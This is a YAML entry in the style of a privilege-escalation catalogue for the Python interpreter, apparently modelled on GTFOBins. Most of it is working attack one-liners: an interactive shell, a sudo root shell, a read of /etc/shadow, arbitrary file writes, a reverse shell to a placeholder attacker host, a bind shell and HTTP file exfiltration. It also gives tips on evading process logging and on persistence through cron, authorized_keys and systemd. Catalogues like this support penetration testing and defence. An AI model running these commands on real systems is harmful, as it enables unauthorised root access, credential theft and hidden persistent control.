---
name: python

capabilities:
  - exec
  - spawn
  - read
  - write
  - bind
  - reverse-shell
  - sudo

required_permissions:
  level: user
  notes: >
    Standard user execution is sufficient for most techniques. Sudo rules
    allowing `python` without NOPASSWD restrictions still provide full root
    exec if password is known. SUID python is rare post-Python 2.7 EOL.

difficulty: low

opsec:
  noise: medium
  artifacts:
    - "Shell history (python -c '...' visible in plaintext)"
    - "/tmp files if writing payloads to disk"
    - "Process list exposes full argument string including commands"
    - "Python may generate .pyc cache files in working directory"
  notes: >
    The -c flag embeds the payload in the process argument string, visible
    in `ps aux` and auditd logs. Prefer piping stdin or reading from a file
    if process argument logging is a concern. Use `python3 -` to read from
    stdin silently.

persistence_potential: true
persistence_notes: >
  Python can write cron entries (open('/etc/cron.d/...')), append to
  authorized_keys, install systemd units, or add SUID wrappers. Full OS
  access makes persistence trivial if write permissions exist.

examples:
  - id: spawn-shell
    description: "Spawn an interactive shell."
    capabilities: [spawn, exec]
    command: |
      python3 -c 'import os; os.execv("/bin/sh", ["sh"])'
    notes: "Useful for upgrading a restricted shell. Replace python3 with python if needed."

  - id: sudo-spawn
    description: "Spawn root shell via sudo."
    capabilities: [spawn, sudo]
    command: |
      sudo python3 -c 'import os; os.system("/bin/bash")'

  - id: read-file
    description: "Read an arbitrary file."
    capabilities: [read]
    command: |
      python3 -c 'print(open("/etc/shadow").read())'

  - id: write-file
    description: "Write arbitrary content to a file."
    capabilities: [write]
    command: |
      python3 -c 'open("/path/to/file","w").write("CONTENT\n")'

  - id: reverse-shell
    description: "TCP reverse shell."
    capabilities: [reverse-shell, exec]
    command: |
      python3 -c '
      import socket,subprocess,os
      s=socket.socket()
      s.connect(("ATTACKER",PORT))
      os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
      subprocess.call(["/bin/sh","-i"])'
    notes: "Change ATTACKER and PORT. Entire payload is one -c argument."

  - id: bind-shell
    description: "Bind shell on a local port."
    capabilities: [bind, exec]
    command: |
      python3 -c '
      import socket,subprocess
      s=socket.socket()
      s.bind(("",PORT)); s.listen(1)
      c,_=s.accept()
      import os
      os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2)
      subprocess.call(["/bin/sh","-i"])'

  - id: http-server-exfil
    description: "Serve current directory over HTTP (file exfil)."
    capabilities: [upload, bind]
    command: |
      python3 -m http.server 8080

references:
  - "https://gtfobins.github.io/gtfobins/python/"
  - "https://docs.python.org/3/library/os.html#os.execv"

tags:
  - scripting
  - reverse-shell
  - bind-shell
  - exfil
  - suid
---
